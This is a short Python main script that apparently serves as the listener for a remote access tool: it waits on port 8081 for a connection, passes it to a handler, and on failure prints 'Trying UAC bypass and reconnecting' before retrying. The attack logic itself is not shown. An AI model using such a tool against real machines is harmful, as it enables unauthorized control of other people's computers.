from core.connection.conn import Server
from core.connection.handler import connection_handler
from core.utils import display_msg
import time



if __name__ == "__main__":
    while True:
        try:
            server = Server(port=8081)
            server.wait_to_connect()
            connection_handler(server)
            server.close()
            break
        except ConnectionError as err:
            display_msg("Trying UAC bypass and reconnecting")
            time.sleep(5)
            server.conn.close()
            server.close()
            pass 
